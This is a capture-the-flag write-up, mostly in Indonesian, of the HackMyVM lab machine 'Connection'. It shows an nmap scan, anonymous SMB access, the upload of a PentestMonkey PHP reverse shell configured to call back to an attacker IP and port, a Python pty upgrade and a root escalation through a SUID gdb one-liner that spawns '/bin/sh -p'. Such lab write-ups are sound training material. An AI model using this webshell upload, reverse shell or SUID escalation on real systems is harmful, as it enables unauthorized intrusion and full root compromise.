---
layout: post
title:  "HackMyVM: Connection"
date:   2021-05-13 21:03:36 +0530
categories: [hackmyvm]
tags: [smb, ftp, suid, gdb, gtfobins]
---

kebosanan masih menyerang sampai hari ke 2 dari pertama kali bermain [HackMyVM](https://hackmyvm.eu). Baru dapat dilema pengen kembali main [HTB](https://hackthebox.eu) sama pengen coba mesin-mesin di [HMV](https://hackmyvm.eu). Haduh bingung men, jadi saya memutuskan untuk melanjutkan mesin ke 3 dari awal, dengan nama mesin [Connection](https://hackmyvm.eu/machines/machine.php?vm=Connection) yang mungkin masih dalam difficult easy.

## Contents
* [Reconnaissance](#recon)
    * [Getting IP Host Machine](#netdiscover)
    * [Ports](#nmap)
* [Shell as www-data](#data)
* [PrivEsc](#privesc)

## Recon {#recon}
### Getting IP Host Machine {#netdiscover}
![netdiscover](https://i.postimg.cc/XvNJhLmk/connection-1.png)

### Ports {#nmap}
```bash
auvia connection # nmap -A -sCV connection.hmv -oN scan_new.nmap

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 19:23 WIB
Nmap scan report for connection.hmv (192.168.56.111)
Host is up (0.00034s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:55:A1:39 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m52s, deviation: 2h18m34s, median: -7s
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2021-05-30T08:23:38-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-30T12:23:38
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms connection.hmv (192.168.56.111)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.58 seconds

```
Ports scanned, SSH (22), HTTP (80), Samba (139, 445). What is [Samba](https://www.samba.org/samba/what_is_samba.html)? probably like suatu komponen penting Unix yang terintegrasi dengan mulus terhadap lingkungan directory aktif (source: <https://samba.org>). So, saya disini akan menggunakan **smbclient** untuk melihat-lihat direktori yang aktif. Di mesin ini kita akan masuk dan login sebagai *guest* saja. terlihat dari scanning nmap diatas.
```s
| smb-security-mode: 
|   account_used: guest
```

## Shell as www-data {#data}
```vb
aoba connection # smbclient -L ////connection.hmv
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	share           Disk      
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Private Share for uploading files)
SMB1 disabled -- no workgroup available
```
disitu terlihat directory `share` aktif sebagai sarana saya untuk masuk dan mengunggah sebuah reverse shell PHP yang dibuat oleh [PentestMonkey](https://pentestmonkey.net).

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.1';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
``` 
lalu kita unggah reverse shell tadi via *smbclient*.
```bash
aoba connection # ls
index.html  passwd  scan_new.nmap  scan.nmap  shell.php
aoba connection # smbclient \\\\connection.hmv\\share
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 23 08:48:39 2020
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  html                                D        0  Wed Sep 23 09:20:00 2020

		7158264 blocks of size 1024. 5462860 blocks available
smb: \> cd html
smb: \html\> ls
  .                                   D        0  Wed Sep 23 09:20:00 2020
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  index.html                          N    10701  Wed Sep 23 08:48:45 2020

		7158264 blocks of size 1024. 5462860 blocks available
smb: \html\> put shell.php
putting file shell.php as \html\shell.php (45.1 kb/s) (average 45.1 kb/s)
smb: \html\> ls
  .                                   D        0  Wed Jun  2 01:34:56 2021
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  index.html                          N    10701  Wed Sep 23 08:48:45 2020
  shell.php                           A     5494  Wed Jun  2 01:34:56 2021

		7158264 blocks of size 1024. 5462852 blocks available
smb: \html\> 
```
jika ingin lebih gampang, kalian (para pembaca) bisa menginstall lewat package manager yang ada pada distro kalian masing-masing.
```s
auvia connection # pacman -S webshells
```
dan itu akan terinstall automatically ke mesin kalian pada directory **/usr/share/webshells**.

tell me if im leet.

![img](https://i.postimg.cc/sDZkGcZL/connection-2.png)

## PrivEsc {#privesc}
```sh
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@connection:/$ export TERM=xterm-256color
```
line pertama, untuk memunculkan bash yang nyaman dipandang. sedangkan line kedua untuk you knowlah kenyamanan terminal `xterm-256color`. dan ya, mari kita cek SUID dulu untuk menemukan binary yang bisa tingkat lanjut ke tahap ekskalasi root.
```cs
www-data@connection:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd

```
`gdb` adalah sesuatu yang menarik untuk dijadikan bahan ekskalasi. [gtfobins](https://gtfobins.github.io) lagi dan lagi...

```vb
www-data@connection:/$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
"-p")' -ex quitthon import os; os.execl("/bin/sh", "sh", "
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# cd /root
# ls
ls
proof.txt
# cat proof.txt
a7c6ea4931ab86fb54c540xxxxxxxxxx
```
